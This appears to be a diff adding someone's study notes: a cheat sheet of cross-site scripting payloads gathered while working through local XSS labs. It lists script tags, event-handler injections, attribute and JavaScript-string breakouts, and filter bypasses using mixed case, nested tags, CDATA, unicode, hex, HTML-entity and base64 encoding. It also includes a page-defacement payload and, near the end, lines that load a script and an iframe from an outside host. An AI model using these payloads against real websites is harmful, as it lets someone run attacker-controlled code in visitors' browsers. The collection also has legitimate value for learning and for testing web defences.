@@ -1,0 +1,205 @@
+<script>alert('hack!')</script>
+
+salam"><img src="a" onerror="alert('hack')">
+
+salam" autofocus onfocus="alert('test')"
+
+html or xml
+encoding:
+			&name;
+			#&number;
+
+&lt;img src="a" onerror="alert('hack')"&gt;
+&lt;img src=1 onerror=alert(1)&gt;
+
+&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
+&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;&gt;
+<ali:script xmlns:ali="http://www.w3.org/1999/xhtml">alert(1)</ali:script>
+<html xmlns='http://www.w3.org/1999/xhtml'><script>alert('xss')</script></html>
+<a><script>alert('hack!')</script></a>
+
+<salam><![CDATA[<]]>script<![CDATA[>]]>alert('xss');<![CDATA[<]]>/script<![CDATA[>]]></salam>
+<salam><![CDATA[<]]>script<![CDATA[>]]>alert('hack!')<![CDATA[<]]>/script<![CDATA[>]]></salam>
+<salam><![CDATA[<script>alert('hack!')</script>]]></salam>
+
+
+
+eval('var x = 2 + 2');
+console.log(x);
+
+
+
+json :
+	" -> \"
+	
+
+
+<script>alert('hack!')</script>
+<scRipt>alert('hack!')</scripT>
+<sc<scRipt>Ript>alert('hack!')</scr</scripT>ipT>
+
+
+<img src="a" onerror="alert('hack')">
+
+<a href="javascript:alert('hack')">click me!</a>
+
+
+
+
+{"result":[{"fn":"alert('salam') in result ... "}]}
+"}]});alert('salam')//
+
+
+
+
+<a href="javascript:alert('hack')">click me!</a>
+<a href="javascript:al\u0061rt('hack')">click me!</a>
+
+<input type="text" autofocus onfocus="alert('hack2')">
+ 
+<div onmousemove="alert('hack')">!</div>
+
+<svg onload="alert('hack!1111')">
+
+
+
+20';alert('hack')//
+
+20');alert('hack')//
+
+
+;al\u0065rt('hack');
+
+
+btoa('string') => base64
+atob('base64') => string
+
+btoa("alert('hack')"); => YWxlcnQoJ2hhY2snKQ==
+
+;eval(atob('YWxlcnQoJ2hhY2snKQ=='))
+
+
+
+
+<script>alert('hack!')</script>
+
+\x3cscript\x3ealert(`hack`)\x3c\x2fscript\x3e
+
+document.write("\x41") -> A
+
+
+\u003cscript\u003ealert(`hack`)\u003c\u002fscript\u003e
+
+
+
+
+
+javascript:alert('hack');
+
+
+
+
+salam"><script>alert('hack!')</script>
+
+
+
+$_SERVER['PHP_SELF']
+
+/"><script>alert('hack!')</script>
+
+
+<script>alert('hack!')</script>
+
+
+
+</title><script>alert('hack!')</script>
+
+
+<scRipT>alert('hack!')</ScrIpt>
+
+<scR<scRipT>ipT>alert('hack!')</Sc</scRipT>rIpt>
+<img src="a" onerror="alert('hack')">
+
+
+<script>alert(`hack!`)</script>
+<script>alert(/hack!/)</script>
+<script>alert(String.fromCharCode(115, 97, 108, 97, 109))</script>
+
+
+3* 1000);alert('hack!')//
+
+
+<script>prompt('hack!')</script>
+<script>confirm('hack!')</script>
+<script>al\u0065rt('hack!')</script>
+
+<script>document.body.innerHTML=`<h1 align="center">hacked</h1>`</script>
+
+<img src="a" onerror="alert(\'hack\')">
+
+
+<scRipT>alert("hack!")</ScrIpt>
+
+
+
+
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+  	alert('hack!');
+  </script>
+</svg>
+
+
+DOM Document Object Model
+BOM Browser Object Model
+
+ali.ir/a.html
+
+<p id="p1">test</p>
+
+document.getElementById('p1').innerHTML = 'x';
+command jquery ->  
+
+<script>alert('hack!')</script>
+<img src="a" onerror="alert('hack')">
+
+<img src="images/avatarALI" %20onerror="alert('hack!').png'" alt="avatar">
+
+
+<img src="images/avatarALI" +onerror="alert('hack!')//.png'" alt="avatar">
+
+http://localhost/labs/xss/39.php#ALI'onerror=alert('hack!')//
+
+<script>alert(`hack!`)</script>
+
+
+htTp://localhost/hack.js
+btoa("alert('hack!')");
+
+data:text/javascript;base64,YWxlcnQoJ2hhY2shJyk=
+
+
+
+<img src="a" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#104;&#97;&#99;&#107;&#39;&#41;">
+
+<img src="data:text/javascript;base64,YWxlcnQoJ2hhY2shJyk=">
+
+<p style="text-transform: lowercase">ali</p>
+
+
+
+
+<img src="1" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#104;&#97;&#99;&#107;&#33;&#33;&#33;&#39;&#41;">
+
+<script src="http://nodejs-dev.ir/ALI.JS"></script>
+
+<iframe src="http://nodejs-dev.ir/B.HTML"></iframe>
+
+
+
+
+
